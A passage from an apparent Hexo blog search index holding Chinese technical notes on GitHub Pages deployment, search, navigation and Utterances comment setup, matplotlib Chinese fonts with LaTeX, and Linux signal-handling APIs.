class="string">per_channel_affine</span></span><br><span class="line">         <span class="attr">activation :</span> <span class="number">10</span> <span class="string">per_tensor_affine</span></span><br><span class="line"><span class="attr">output_layer_list :</span> [<span class="string">&#x27;DBLE.dual_conv9.lrelu_dup1&#x27;</span>, <span class="string">&#x27;DBF.DBF_conv9.lrelu_dup1&#x27;</span>]</span><br><span class="line"><span class="attr">distill_config :</span> [<span class="string">&#x27;DBLE.dual_conv9.lrelu_dup1&#x27;</span>, <span class="string">&#x27;DBF.DBF_conv9.lrelu_dup1&#x27;</span>]</span><br><span class="line"><span class="attr">distill_coeff :</span> [<span class="number">0.7</span>, <span class="number">0.7</span>]</span><br></pre></td></tr></table></figure> ### Fri Oct 20 09:41:04 HKT 2023</li>
<li>启动了一个没有蒸馏的实验,剩余实验正在修改代码</li>
</ol>
<h3 id="wed-oct-24-104548-hkt-2023">Wed Oct 24 10:45:48 HKT 2023</h3>
<p>启动了一个蒸馏加权系数小一点的网络，发现权重越小效果越好,这会导致开始的情况不是那么坏</p>
]]></content>
      <categories>
        <category>毕业</category>
      </categories>
      <tags>
        <tag>毕业</tag>
        <tag>量化</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo在git上的部署</title>
    <url>/2024/04/08/hexo%E5%9C%A8git%E4%B8%8A%E7%9A%84%E9%83%A8%E7%BD%B2/</url>
    <content><![CDATA[<h1 id="hexo部署过程">hexo部署过程</h1>
<p>整个设置过程主要分为github与hexo两方面的设置。</p>
<h2 id="github">github</h2>
<p>github上需要建立一个特殊名字的仓库<code>your_github_user_name.github.io·</code>，建立为public，不加入README.md</p>
<p><img src="github_page.png" /></p>
<h2 id="hexo">hexo</h2>
<ol type="1">
<li>需要设置在根目录下<code>_config.yml</code>文件，加入或修改如下内容。</li>
</ol>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">git@github.com:username/username.github.io.git</span>      <span class="comment">#项目的ssh地址，使用http的可能会推不上去，我没试过</span></span><br><span class="line">  <span class="comment"># example, https://github.com/hexojs/hexojs.github.io</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">main</span>          <span class="comment"># 随便一个分支，因为这个分支是新建的</span></span><br></pre></td></tr></table></figure>
<ol start="2" type="1">
<li><p>上述配置结束后，还需使用命令<code>npm i --save hexo-deployer-git</code>安装插件<code>hexo-deployer-git</code>。</p></li>
<li><p>执行hexo clean &amp;&amp; hexo deploy</p></li>
</ol>
<p>当上述过程结束后，查看网站<code>username.githubn.io</code>即可发现博客已经部署！！！</p>
<h2 id="参考">参考</h2>
<p><a
href="https://hexo.io/zh-cn/docs/github-pages.html">hexo官方教程</a><br />
<a href="https://pages.github.com/">github page 的设置</a></p>
]]></content>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo博客添加搜索功能</title>
    <url>/2024/04/07/hexo%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD/</url>
    <content><![CDATA[<h1 id="参考">参考</h1>
<p><a
href="https://champyin.com/2019/01/26/%E8%BF%9B%E9%98%B6-%E5%9B%9B-%EF%BC%9A%E7%BB%99%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E7%AB%99%E5%86%85%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD/">如何给网站添加站内搜索功能</a></p>
<h1 id="设置方法">设置方法</h1>
<ol type="1">
<li>安装插件</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i --save hexo-generator-search hexo-generator-searchdb</span><br></pre></td></tr></table></figure>
<ol start="2" type="1">
<li><p>将根目录中配置文件<code>_config.yml</code>添加如下内容
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># local_search</span></span><br><span class="line"><span class="attr">search:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">search.xml</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">post</span></span><br><span class="line">  <span class="attr">format:</span> <span class="string">html</span></span><br><span class="line">  <span class="attr">limit:</span> <span class="number">10000</span></span><br></pre></td></tr></table></figure></p></li>
<li><p>next主题中在<code>theme/next/_config.yml</code>文件中修改如下内容：
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># if auto, trigger search by changing input</span></span><br><span class="line">  <span class="comment"># if manual, trigger search by pressing enter key or search button</span></span><br><span class="line">  <span class="attr">trigger:</span> <span class="string">auto</span></span><br><span class="line">  <span class="comment"># show top n results per article, show all results by setting to -1</span></span><br><span class="line">  <span class="attr">top_n_per_article:</span> <span class="number">1</span></span><br></pre></td></tr></table></figure></p></li>
<li><p>最后启动服务器 hexo clean &amp;&amp; hexo s -d</p></li>
</ol>
]]></content>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo导航栏设置</title>
    <url>/2024/04/07/hexo%E5%AF%BC%E8%88%AA%E6%A0%8F%E8%AE%BE%E7%BD%AE/</url>
    <content><![CDATA[<ol type="1">
<li>先在<code>theme/next/_config.yml</code>中将<code>menu</code>字段配置。举个例子<code>tags: 路径 || 图标</code>，路径是指source下的路径，各个图标点进去会加载index.yml文件。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">menu:</span><br><span class="line">  home: / || fa fa-home</span><br><span class="line">  about: /about/ || fa fa-user</span><br><span class="line">  tags: /tags/ || fa fa-tags</span><br><span class="line">  categories: /categories/ || fa fa-th</span><br><span class="line">  archives: /archives/ || fa fa-archive</span><br><span class="line">  <span class="comment">#schedule: /schedule/ || fa fa-calendar</span></span><br><span class="line">  <span class="comment">#sitemap: /sitemap.xml || fa fa-sitemap</span></span><br><span class="line">  <span class="comment">#commonweal: /404/ || fa fa-heartbeat</span></span><br></pre></td></tr></table></figure>
<ol start="2" type="1">
<li>新建各种对应的页面主要命令如下 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page categories</span><br></pre></td></tr></table></figure></li>
</ol>
<p>相应的会在source下出现一个navigate文件夹，里面有一个<code>index.md</code>文件，需要进行设置</p>
<p>categories设置如下:<br />
<code>使用hexo new page categories</code>生成，修改相应index.md
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: categories</span><br><span class="line"><span class="built_in">date</span>: 2024-04-07 12:23:16</span><br><span class="line"><span class="built_in">type</span>: <span class="string">&quot;categories&quot;</span></span><br><span class="line">comments: <span class="literal">false</span></span><br><span class="line">---</span><br></pre></td></tr></table></figure> tags设置如下:<br />
<code>使用hexo new page tags</code>生成，修改相应index.md <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: tags</span><br><span class="line"><span class="built_in">date</span>: 2024-04-07 12:23:25</span><br><span class="line"><span class="built_in">type</span>: <span class="string">&quot;tags&quot;</span></span><br><span class="line">comments: <span class="literal">false</span></span><br><span class="line">---</span><br></pre></td></tr></table></figure>
archives设置如下： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">无需修改，将theme/next/_config.yml中menu中archives位置修改即可。</span><br></pre></td></tr></table></figure></p>
<ol start="3" type="1">
<li>新设定栏目</li>
</ol>
<p>一些栏在next主题中没有预先设定，但设定过程主要是将<code>theme/next/_config.yml</code>中<code>menu</code>添加新的字段
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">menu:</span><br><span class="line">  home: / || fa fa-home</span><br><span class="line">  <span class="comment"># about: /about/ || fa fa-user</span></span><br><span class="line">  tags: /tags/ || fa fa-tags</span><br><span class="line">  categories: /categories/ || fa fa-th</span><br><span class="line">  archives: /archives/ || fa fa-archive</span><br><span class="line">  navigation: /navigation || fa fa-user</span><br><span class="line">  <span class="comment">#schedule: /schedule/ || fa fa-calendar</span></span><br><span class="line">  <span class="comment">#sitemap: /sitemap.xml || fa fa-sitemap</span></span><br><span class="line">  <span class="comment">#commonweal: /404/ || fa fa-heartbeat</span></span><br></pre></td></tr></table></figure> 上述代码中添加了<code>navigation</code>字段，</p>
<p>但是在显示中有如下情况：</p>
<figure>
<img src="languages_setting.png" alt="languages_setting" />
<figcaption aria-hidden="true">languages_setting</figcaption>
</figure>
<p>可以看到导航为英文，这里将<code>theme/next/languages/zh-CN.yml</code>中相关部分进行翻译，设置如下</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">首页</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">归档</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">分类</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">标签</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">关于</span></span><br><span class="line">  <span class="attr">search:</span> <span class="string">搜索</span></span><br><span class="line">  <span class="attr">schedule:</span> <span class="string">日程表</span></span><br><span class="line">  <span class="attr">sitemap:</span> <span class="string">站点地图</span></span><br><span class="line">  <span class="attr">commonweal:</span> <span class="string">公益</span> <span class="number">404</span></span><br><span class="line">  <span class="attr">navigation:</span> <span class="string">导航</span></span><br></pre></td></tr></table></figure>
<p>将navigation给出相关翻译即可</p>
<figure>
<img src="language_seting_2.png" alt="language_seting_2" />
<figcaption aria-hidden="true">language_seting_2</figcaption>
</figure>
<ol start="4" type="1">
<li>主页设定</li>
</ol>
<p><a href="https://segmentfault.com/a/1190000039871393">主页设定</a>
在没有设定主页之前，hexo主要使用根目录<code>_config.yml</code>指定的主页，即显示写好的文章，
这样并不好看，可以通过如下设置得到主页 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">根路径下_config.yml设置如下：</span><br><span class="line">index_generator:</span><br><span class="line">  path: /default-index/       <span class="comment"># 这是一个无效的路径，主要目的是将hexo中默认主页去掉换位next皮肤指定的主页，也就是source下的index.md文件显示的内容</span></span><br><span class="line">  per_page: 10</span><br><span class="line">  order_by: -<span class="built_in">date</span></span><br><span class="line"></span><br><span class="line">./theme/next/_config.yml</span><br><span class="line"></span><br><span class="line">只需将menu相应的home开关打开就行,之后在<span class="built_in">source</span>下建立index.md文件</span><br></pre></td></tr></table></figure></p>
]]></content>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo界面</title>
    <url>/2024/05/07/hexo%E7%95%8C%E9%9D%A2/</url>
    <content><![CDATA[<h1 id="参考">参考</h1>
<p><a
href="https://mongolian.github.io/2018/07/16/Hexo%E7%BE%8E%E5%8C%96/">参考1</a><br />
<a
href="https://blog.csdn.net/TomAndersen/article/details/104872852">如何加入背景图片</a><br />
<a
href="https://juejin.cn/post/7217267332656742460">hexo界面优化</a></p>
]]></content>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo评论系统</title>
    <url>/2024/04/08/hexo%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<h1 id="评论系统添加">评论系统添加</h1>
<p>主要思路是使用Utterances作为评论系统，通过使用github中的issue来添加评论。</p>
<h2 id="github端配置">github端配置</h2>
<ol type="1">
<li><p>首先找一个仓库，用于存储评论，可以新建一个仓库专门做这个。本人使用博客源码仓库的issue作为评论区。注意这个仓库一定是public，否则无法公开</p></li>
<li><p>安装Utterances，安装地址为<a
href="https://github.com/apps/utterances">https://github.com/apps/utterances</a>，直接点击install即可。</p></li>
</ol>
<figure>
<img src="utterance_app_install.png" alt="utterance_app_install" />
<figcaption aria-hidden="true">utterance_app_install</figcaption>
</figure>
<p>之后需要将这个app与仓库关联： <img src="config_utterance.png"
alt="config_utterance" /></p>
<h2 id="hexo端配置">hexo端配置</h2>
<p>参考了两篇配置，这里使用了配置一</p>
<p>配置一：</p>
<p>所有配置均在<code>/theme/next</code>下</p>
<ol type="1">
<li><p>创建<code>theme/next/layout/_third-party/comments/utterances.swig</code>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%- if page.comments %&#125;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">NexT.utils.loadComments(document.querySelector(&#x27;#utterances-container&#x27;), () =&gt; &#123;</span><br><span class="line">    // if (typeof parcelRequire === &#x27;function&#x27;) &#123; return; &#125;</span><br><span class="line">    var js = document.createElement(&#x27;script&#x27;);</span><br><span class="line">    js.type = &#x27;text/javascript&#x27;;</span><br><span class="line">    js.src = &#x27;https://utteranc.es/client.js&#x27;;</span><br><span class="line">    js.async = true;</span><br><span class="line">    js.crossorigin = &#x27;anonymous&#x27;;</span><br><span class="line">    js.setAttribute(&#x27;repo&#x27;, &#x27;&#123;&#123; theme.utterances.repo &#125;&#125;&#x27;);</span><br><span class="line">    js.setAttribute(&#x27;issue-term&#x27;, &#x27;&#123;&#123; theme.utterances.issue_term &#125;&#125;&#x27;);</span><br><span class="line">    js.setAttribute(&#x27;theme&#x27;, &#x27;&#123;&#123; theme.utterances.theme &#125;&#125;&#x27;);</span><br><span class="line">    document.getElementById(&#x27;utterances-container&#x27;).appendChild(js);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&#123;%- endif %&#125;</span><br></pre></td></tr></table></figure></p></li>
<li><p>创建<code>theme/next/scripts/filters/comment/utterances.js</code>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* global hexo */</span><br><span class="line">&#x27;use strict&#x27;;</span><br><span class="line">const path = require(&#x27;path&#x27;);</span><br><span class="line">// Add comment</span><br><span class="line">hexo.extend.filter.register(&#x27;theme_inject&#x27;, injects =&gt; &#123;</span><br><span class="line">  let theme = hexo.theme.config;</span><br><span class="line">  if (!theme.utterances.enable) return;</span><br><span class="line">  injects.comment.raw(&#x27;utterances&#x27;, &#x27;&lt;div class=&quot;comments&quot; id=&quot;utterances-container&quot;&gt;&lt;/div&gt;&#x27;, &#123;&#125;, &#123;cache: true&#125;);</span><br><span class="line">  injects.bodyEnd.file(&#x27;utterances&#x27;, path.join(hexo.theme_dir, &#x27;layout/_third-party/comments/utterances.swig&#x27;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></p></li>
<li><p>修改<code>theme/next/_config.yml</code> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">utterances: </span><br><span class="line">  enable: true</span><br><span class="line">  repo: &quot;username/repo_name&quot;            # 表示仓库位置</span><br><span class="line">  issue_term: &quot;pathname&quot;                # 表示评论在issue中的表示形式</span><br><span class="line">  theme: &quot;github-light&quot;                 # 评论区主题</span><br></pre></td></tr></table></figure></p></li>
<li><p>修改<code>_config.yml</code> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># URL</span></span><br><span class="line"><span class="comment">## Set your site url here. For example, if you use GitHub Page, set url as &#x27;https://username.github.io/project&#x27;</span></span><br><span class="line">url: https://skk1faker.github.io</span><br><span class="line">permalink: :year/:month/:day/:title/</span><br><span class="line">permalink_defaults:</span><br><span class="line">pretty_urls:</span><br><span class="line">  trailing_index: <span class="literal">true</span> <span class="comment"># Set to false to remove trailing &#x27;index.html&#x27; from permalinks</span></span><br><span class="line">  trailing_html: <span class="literal">true</span> <span class="comment"># Set to false to remove trailing &#x27;.html&#x27; from permalinks</span></span><br></pre></td></tr></table></figure>
注意一定要设置url，因为评论系统需要和github关联，在关联结束后会返回跳转到我们的主界面，需要使用url中的地址，这个地址直接写为博客地址即可。否则会404</p></li>
</ol>
<figure>
<img src="404_page.png" alt="404_page" />
<figcaption aria-hidden="true">404_page</figcaption>
</figure>
<p>在这张图中，原url为<code>example.com</code></p>
<h1 id="参考">参考</h1>
<p><a
href="https://nekodaemon.com/2020/05/20/Hexo-Next%E4%B8%BB%E9%A2%98%E6%B7%BB%E5%8A%A0Utterances%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F/">评论格式设置参考</a><br />
<a
href="https://blog.lanweihong.com/posts/24011/">utterancess安装参考</a></p>
]]></content>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>man kill命令得到的不是c函数，应怎样处理</title>
    <url>/2024/03/25/man-kill%E5%91%BD%E4%BB%A4%E5%BE%97%E5%88%B0%E7%9A%84%E4%B8%8D%E6%98%AFc%E5%87%BD%E6%95%B0%EF%BC%8C%E5%BA%94%E6%80%8E%E6%A0%B7%E5%A4%84%E7%90%86/</url>
    <content><![CDATA[<p>使用<code>man 2 kill</code>即可解决，注意前面的 2，它指示 man
命令查找系统调用（通常是库函数）的手册页。在大多数系统上，1
表示用户命令，2 表示系统调用，3 表示库函数等。</p>
]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>matplotlib使用中文字体</title>
    <url>/2024/02/10/matplotlib%E4%BD%BF%E7%94%A8%E4%B8%AD%E6%96%87%E5%AD%97%E4%BD%93/</url>
    <content><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/32981102">参考</a> <a
href="https://github.com/StellarCN/scp_zh/blob/master/fonts/SimHei.ttf">SimHei下载地址</a>
<a
href="https://blog.csdn.net/OldDriver1995/article/details/114827088">代码参考</a>
<a href="https://zhuanlan.zhihu.com/p/32981102">清除缓存参考</a></p>
<p>首先下载simHei字体，将这个字体放在<code>/home/skt1faker/anaconda3/envs/homework/lib/python3.9/site-packages/matplotlib/mpl-data/fonts/ttf</code>下，路径的位置是<code>python -c "import matplotlib; print(matplotlib.matplotlib_fname())"</code>，这个是个文件位置，上一级就快到我们要找的路径了。</p>
<p>之后代码中加入 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib <span class="keyword">as</span> mpl  </span><br><span class="line">mpl.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span></span><br><span class="line">mpl.rcParams[<span class="string">&#x27;font.family&#x27;</span>] = <span class="string">&#x27;SimHei&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> matplotlib.font_manager <span class="keyword">import</span> _rebuild</span><br><span class="line">_rebuild()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
注意<code>from matplotlib.font_manager import _rebuild</code>可能会报错，这个时候就要手动进行内存的清除，使用命令<code>pyhton -c "import matplotlib;print(matplotlib.get_cachedir())"</code>即可得到缓存位置<code>/home/skt1faker/.cache/matplotlib/*</code>之后运行<code>rm -rf /home/skt1faker/.cache/matplotlib/*</code>重新运行程序即可使用当前SinHei字体</p>
<h2 id="latex显示">latex显示</h2>
<p>需要进行如下配置来晚上环境 <a
href="https://stackoverflow.com/questions/58121461/runtimeerror-failed-to-process-string-with-tex-because-latex-could-not-be-found">环境配置</a>
<a
href="https://stackoverflow.com/questions/31214214/matplotlib-error-latex-was-not-able-to-process-the-following-string-lp">环境配置B</a>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install texlive texlive-latex-extra texlive-fonts-recommended dvipng</span><br><span class="line">pip install latex</span><br></pre></td></tr></table></figure></p>
<h2 id="latex与中文共同显示">latex与中文共同显示</h2>
<p>最后使用matplotlib中使用latex直接使用如下代码，如果需要中文显示需要设置字体
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> matplotlib <span class="keyword">as</span> mpl</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f5</span>():</span><br><span class="line">   <span class="comment"># 设置matplotlib库字体的非衬线字体为黑体</span></span><br><span class="line">   plt.rcParams[<span class="string">&quot;font.sans-serif&quot;</span>]=[<span class="string">&quot;SimSun&quot;</span>]</span><br><span class="line">   <span class="comment"># 设置matplotlib库字体族为非衬线字体</span></span><br><span class="line">   plt.rcParams[<span class="string">&quot;font.family&quot;</span>]=<span class="string">&quot;sans-serif&quot;</span></span><br><span class="line">   x = [<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>, <span class="number">400</span>, <span class="number">500</span>]</span><br><span class="line">   y = [<span class="number">100</span>, <span class="number">300</span>, <span class="number">500</span>, <span class="number">700</span>, <span class="number">900</span>]</span><br><span class="line">   fig, ax = plt.subplots()</span><br><span class="line">   ax.plot(x, y)</span><br><span class="line">   x_labels = [<span class="string">r&#x27;第五重要特征&#x27;</span>, <span class="string">r&#x27;第四重要特征&#x27;</span>, <span class="string">r&#x27;第三重要特征&#x27;</span>, <span class="string">r&#x27;第二重要特征&#x27;</span>, <span class="string">r&#x27;第一重要特征&#x27;</span>]</span><br><span class="line">   <span class="comment"># x_labels = [&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;1&#x27;]</span></span><br><span class="line">   y_labels = [<span class="string">r&#x27;$\lambda_&#123;min&#125;$&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">r&#x27;$\lambda_&#123;max&#125;$&#x27;</span>]</span><br><span class="line">   ax.set_xticks(x)</span><br><span class="line">   ax.set_yticks(y)</span><br><span class="line">   ax.set_xticklabels(x_labels)</span><br><span class="line">   ax.set_yticklabels(y_labels)</span><br><span class="line">   ax.scatter(x,y,color=<span class="string">&#x27;red&#x27;</span>,marker=<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">   <span class="comment"># plt.xticks(rotation=45)</span></span><br><span class="line">   plt.savefig(<span class="string">&#x27;hhh.pdf&#x27;</span>,dpi=<span class="number">200</span>,bbox_inches=<span class="string">&#x27;tight&#x27;</span>, pad_inches=<span class="number">0.1</span>)</span><br><span class="line">   plt.close()</span><br><span class="line">   <span class="comment"># plt.show()</span></span><br><span class="line"></span><br><span class="line">f5() </span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
]]></content>
      <tags>
        <tag>绘图</tag>
      </tags>
  </entry>
  <entry>
    <title>linux进程间通讯</title>
    <url>/2024/03/24/linux%E9%80%9A%E8%AE%AF/</url>
    <content><![CDATA[<h1 id="信号">信号</h1>
<p><a href="http://gityuan.com/2015/12/20/signal/">信号的机制</a><br />
<a
href="https://blog.csdn.net/weixin_45074185/article/details/108626878">信号的忽略、捕捉和屏蔽</a>
<a
href="https://blog.csdn.net/qq_33154343/article/details/105448914">什么是未决信号集，以及进程的信号集如何处理</a></p>
<h2 id="概念">概念</h2>
<p>阻塞信号集：当属于阻塞信号集的信号A来临时，进程并不会处理。只有信号A阻塞解除时，原先到来的信号A才会被处理。相当于一直阻塞不处理。
未决信号集：当前进程未处理的信号</p>
<h2 id="信号特性">信号特性</h2>
<ol type="1">
<li>一个进程对应一个PCB，PCB中存在信号屏蔽字A，决定了进程屏蔽那些信号，当进程接收到某个信号后调用相应的信号处理函数，此时进程的信号屏蔽字不再是PCB中的A，而是此信号函数中<code>sa_mask</code>决定</li>
<li>在信号A的捕捉函数执行期间，信号A会被自动屏蔽</li>
<li>阻塞信号不支持排队，产生多次只记录一次。实时信号支持排队（阻塞信号的信号值为1-31，实时信号的信号值为32-64）(阻塞信号与不可靠信号同义，可靠信号与实时信号同义)</li>
</ol>
<h2 id="信号处理时机">信号处理时机</h2>
<p>当进程唤醒或者调度后获取CPU，则会从内核态转到用户态时检测是否有signal等待处理，处理完，进程会把相应的未决信号从链表中去掉。<br />
信号的处理时机在内核态转向用户态的过程中，故处理流程如下：<br />
内核态 --&gt; signal信号处理 --&gt; 用户态</p>
<h2 id="信号的处理方式有三种">信号的处理方式有三种</h2>
<ol type="1">
<li>默认处理：使用默认行为处理</li>
<li>自定义：利用自定义信号处理函数执行</li>
<li>忽略：接收后不做任何反应 ### 如何忽略信号 <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">sighandler_t</span> <span class="title">signal</span><span class="params">(<span class="type">int</span> signum, <span class="type">sighandler_t</span> handler)</span></span>;</span><br><span class="line"><span class="comment">// 参数：</span></span><br><span class="line"><span class="comment">// signum： 信号</span></span><br><span class="line"><span class="comment">// handler：处理动作，传SIG_IGN表示忽略</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="处理信号的函数">处理信号的函数</h2>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sigaction</span><span class="params">(<span class="type">int</span> signum, <span class="type">const</span> <span class="keyword">struct</span> sigaction *act, <span class="keyword">struct</span> sigaction *oldact)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// signum表示要处理的信号</span></span><br><span class="line"><span class="comment">// act表示处理信号时相应的设定，如信号屏蔽字，信号处理函数，以及信号处理后的表现</span></span><br><span class="line"><span class="comment">// oldact表示设定信号处理方式前signum信号如何处理，方便恢复以前的处理方式，可以传为NULL</span></span><br></pre></td></tr></table></figure>
<p>可以看到处理函数中需要用sigaction结构体，sigaction结构体个数如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">   <span class="keyword">struct</span> <span class="title class_">sigaction</span> &#123;</span><br><span class="line">        <span class="built_in">void</span>     (*sa_handler)(<span class="type">int</span>);</span><br><span class="line">        <span class="built_in">void</span>     (*sa_sigaction)(<span class="type">int</span>, <span class="type">siginfo_t</span> *, <span class="type">void</span> *);</span><br><span class="line">        <span class="type">sigset_t</span>   sa_mask; </span><br><span class="line">        <span class="type">int</span>       sa_flags; </span><br><span class="line">        <span class="built_in">void</span>     (*sa_restorer)(<span class="type">void</span>);</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="comment">// sa_restorer：该元素是过时的，不应该使用，POSIX.1标准将不指定该元素。(弃用)</span></span><br><span class="line"><span class="comment">// sa_sigaction：当sa_flags被指定为SA_SIGINFO标志时，使用该信号处理程序。(很少使用)，但这种用法可获得发送信号的进程pid等丰富信息</span></span><br><span class="line"><span class="comment">// sa_handler：指定信号捕捉后的处理函数名(即注册函数)。也可赋值为SIG_IGN表忽略 或 SIG_DFL表执行默认动作</span></span><br><span class="line">   sa_sigaction接收函数形式为<span class="function"><span class="type">void</span> <span class="title">name</span><span class="params">(<span class="type">int</span> pid_num, <span class="type">siginfo_t</span> *info, <span class="type">void</span>* context)</span></span>;</span><br><span class="line">   sa_handler接收函数形式为<span class="function"><span class="type">void</span> <span class="title">name</span><span class="params">(<span class="type">int</span> pid_num)</span></span>;</span><br><span class="line"><span class="comment">// sa_mask: 调用信号处理函数时，所要屏蔽的信号集合(信号屏蔽字)。注意：仅在处理函数被调用期间屏蔽生效，是临时性设置。</span></span><br><span class="line"><span class="comment">// sa_flags：通常设置为0，表使用默认属性。以下为可设定值</span></span><br><span class="line"><span class="comment">//  SA_RESTART：使被信号打断的syscall重新发起。</span></span><br><span class="line"><span class="comment">//  SA_NOCLDSTOP：使父进程在它的子进程暂停或继续运行时不会收到 SIGCHLD 信号。</span></span><br><span class="line"><span class="comment">//  SA_NOCLDWAIT：使父进程在它的子进程退出时不会收到SIGCHLD信号，这时子进程如果退出也不会成为僵 尸进程。</span></span><br><span class="line"><span class="comment">//  SA_NODEFER：使对信号的屏蔽无效，即在信号处理函数执行期间仍能发出这个信号。</span></span><br><span class="line"><span class="comment">//  SA_RESETHAND：信号处理之后重新设置为默认的处理方式。</span></span><br><span class="line"><span class="comment">//  SA_SIGINFO：使用sa_sigaction成员而不是sa_handler作为信号处理函数。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="处理进程的信号集">处理进程的信号集</h3>
<p>主要包括设定阻塞信号集和读取未决信号集。 1. 设定阻塞信号集：
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sigprocmask</span><span class="params">(<span class="type">int</span> how, <span class="type">const</span> <span class="type">sigset_t</span> *restrict set, <span class="type">sigset_t</span> *restrict oset)</span></span>;</span><br><span class="line">    how： 假设当前屏蔽的信号屏蔽字符为 mask；</span><br><span class="line">        SIG_BLOCK: 相当于 mask = mask | <span class="built_in">set</span> (set 为需要屏蔽的信号集)</span><br><span class="line">        SIG_UNBLOCK： 相当于 mask = mask &amp; ~<span class="built_in">set</span> (set 为需要解除屏蔽的信号集)</span><br><span class="line">        SIG_SETMASK： 相当于 mask = <span class="built_in">set</span> (set 为用于替代原始屏蔽集的新屏蔽集)</span><br></pre></td></tr></table></figure> 2. 读取未决信号集</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sigpending</span><span class="params">(<span class="type">sigset_t</span> *set)</span></span>;</span><br><span class="line">读取当前信号的未决信号集。参数为输出参数，内核将未决信号集写入 set</span><br></pre></td></tr></table></figure>
<h3 id="如何绑定信号处理函数">如何绑定信号处理函数</h3>
<p><code>sa_handler</code>：指定信号捕捉后的处理函数名(即注册函数)。也可赋值为<code>SIG_IGN</code>表忽略
或 <code>SIG_DFL</code>表执行默认动作</p>
<h3 id="如何设定处理函数的信号屏蔽字">如何设定处理函数的信号屏蔽字</h3>
